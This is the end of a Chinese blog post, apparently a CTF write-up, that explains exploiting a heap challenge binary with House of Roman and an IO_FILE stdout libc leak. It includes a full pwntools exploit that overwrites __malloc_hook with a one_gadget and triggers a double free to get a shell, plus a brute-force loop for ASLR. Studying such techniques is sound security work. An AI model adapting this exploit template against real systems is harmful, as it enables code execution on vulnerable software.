+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">over</span> = <span class="string">"A"</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line"><span class="keyword">over</span> += <span class="string">"\xa4\xd2\xaf"</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">0</span>,<span class="keyword">over</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/03/20/86BaVA.png" alt="86BaVA.png"><br>可以看到 此时  malloc_hook中的地址中的内容 已经是 one_gadget 在内存中的地址了。<br>第五步<br>free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。<br>我们连续free 掉前面 申请的heapptr[18] 对应的chunk。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">18</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">18</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到  拿到 shell。<br><img src="https://s1.ax1x.com/2020/03/20/86BdUI.png" alt="86BdUI.png"><br><br>当开启aslr后：<br>因为 循环执行以上exp，是有可能成功getshell的，就要看 运气了 。</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">`seq 1 5000`</span>; <span class="keyword">do</span> python <span class="keyword">final</span>.py; done;</span><br></pre></td></tr></table></figure>
+
+<p>我在我电脑上 是没有成功(应该是我没让它跑足够多的时间)，理论上是可以成功的，而且也有人成功。</p>
+<h1 id="新解"><a href="#新解" class="headerlink" title="新解:"></a>新解:</h1><p>上面确实是一个好的 aslr的bypass 姿势，但基本上 如果程序中 可以 leak的话， 一般是直接打IO_file leak libc 了，然后哦就是常规 做法了，成功率 1/16.<br>如果 又不熟悉的  大家 可以 网上 搜索下  “IO_FILE泄露 libc” 学习下，这里就不多 阐述了。</p>
+<h2 id="新解思路："><a href="#新解思路：" class="headerlink" title="新解思路："></a>新解思路：</h2><p>通过引起堆块重叠 然后修改下一个chunk的末尾两个字节 然后将块申请到stdout上 然后泄漏io_stdin的地址 再用堆块重叠写mallochook为onegadget<br>最后同样 free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。</p>
+<hr>
+<p>就放一个 该题的一个 exp（请教的 fmyy师傅），// 注意，可以当模板哦！吹爆 fmyy 师傅 ，哈哈。</p>
+<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import*</span><br><span class="line">def <span class="builtin-name">add</span>(size,idx):</span><br><span class="line">	#p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	#p.sendline(str(size))</span><br><span class="line">	#p.sendline(str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">'Free'</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter size of chunk :'</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter index :'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">	p.sendlineafter(<span class="string">'Free'</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter index :'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">edit</span>(idx,data):</span><br><span class="line">	#p.recvuntil(<span class="string">'Free'</span>)</span><br><span class="line">	#p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	#p.recvuntil(<span class="string">'Enter index of chunk :'</span>)</span><br><span class="line">	#p.sendline(str(idx))</span><br><span class="line">	#p.recvuntil(<span class="string">'Enter data :'</span>)</span><br><span class="line">	#p.send(data)</span><br><span class="line">	p.sendlineafter(<span class="string">'Free'</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter index of chunk :'</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">'Enter data :'</span>,data)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./new_chall'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>,<span class="attribute">checksec</span>=<span class="literal">False</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Enter name :'</span>,<span class="string">'FMYY'</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x18,0)</span><br><span class="line"><span class="builtin-name">add</span>(0xC8,1)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,2)</span><br><span class="line"><span class="builtin-name">edit</span>(1,<span class="string">'\x00'</span><span class="number">*0</span>x68 + p64(0x61))</span><br><span class="line">free(1)</span><br><span class="line"><span class="builtin-name">add</span>(0xC8,1)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,3)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,4)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,5)</span><br><span class="line"><span class="builtin-name">edit</span>(0,<span class="string">'\x00'</span><span class="number">*0</span>x18 + <span class="string">'\x71'</span>)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line"><span class="builtin-name">edit</span>(3,<span class="string">'\x20'</span>)</span><br><span class="line"><span class="builtin-name">edit</span>(1,<span class="string">'\xDD\x25'</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,9)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,9)</span><br><span class="line">payload = <span class="string">'\x00'</span><span class="number">*0</span>x33 + p64(0xFBAD1800) + p64(0)<span class="number">*3</span> + <span class="string">'\x88'</span></span><br><span class="line"><span class="builtin-name">add</span>(0x68,9)</span><br><span class="line"><span class="builtin-name">edit</span>(9,payload)</span><br><span class="line"><span class="comment">#修改stdout的flag位为0xfbad1800</span></span><br><span class="line"><span class="comment">#bing将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(8,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"><span class="builtin-name">edit</span>(4,p64(0))</span><br><span class="line"><span class="builtin-name">add</span>(0x68,0)</span><br><span class="line">free(0)</span><br><span class="line"><span class="builtin-name">edit</span>(0,p64(libc.symbols[<span class="string">'__malloc_hook'</span>] - 0x23))</span><br><span class="line"><span class="builtin-name">add</span>(0x68,0)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,0)</span><br><span class="line">p.sendlineafter(<span class="string">'Free'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter index of chunk :'</span>,<span class="string">'0'</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span><span class="number">*0</span>x13+p64(libc_base+0xF02A4))</span><br><span class="line"><span class="comment">#向malloc_hook 地址里写入 onegadget </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。</span></span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>在程序中 没有leak(fclose(stdout))的时候，我们就只能选择House_of_Roman （全程爆破）去pwn，如果 可以leak，我们就可以 直接 打 IO_file 去泄露libc，然后常规 pwn 就可以了。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//wiki.x10sec<span class="meta">.org</span>/pwn/io_file/introduction/<span class="meta">#printfputs</span></span><br><span class="line"><span class="symbol">https:</span>//n0va-scy.github.io/<span class="number">2019</span>/<span class="number">09</span>/<span class="number">21</span>/IO_FILE/</span><br><span class="line"><span class="symbol">https:</span>//xz.aliyun.com/t/<span class="number">2316</span><span class="meta">#toc-3</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/House系列/" rel="tag">#House系列</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/22/GXYCTF_wp0/" rel="next" title="GXYCTF_wp0">
+                <i class="fa fa-chevron-left"></i> GXYCTF_wp0
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
+          <p class="site-author-name" itemprop="name">木头</p>
+          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">52</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		  <br>
+		  <span id="busuanzi_container_site_uv">
+			<b><span id="busuanzi_value_site_uv"></span></b><br>
+			<span class="site-state-item-name">访客</span>
+			</span>
+
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
+    
+		<br>
+		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p>姓名：木头<br>
+		性别：男<br>
+		QQ：1594783824<br>
+		爱好：书,球,歌<br>
+		主要奖项： xxx</p>
+		</div>
+		<br>
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用方式："><span class="nav-number">2.</span> <span class="nav-text">利用方式：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析："><span class="nav-number">3.</span> <span class="nav-text">漏洞分析：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用："><span class="nav-number">4.</span> <span class="nav-text">漏洞利用：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第二步-："><span class="nav-number">4.1.</span> <span class="nav-text">第二步 ：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四步："><span class="nav-number">4.2.</span> <span class="nav-text">第四步：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新解"><span class="nav-number">5.</span> <span class="nav-text">新解:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#新解思路："><span class="nav-number">5.1.</span> <span class="nav-text">新解思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp："><span class="nav-number">5.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结："><span class="nav-number">6.</span> <span class="nav-text">总结：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接："><span class="nav-number">6.1.</span> <span class="nav-text">参考链接：</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">木头</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
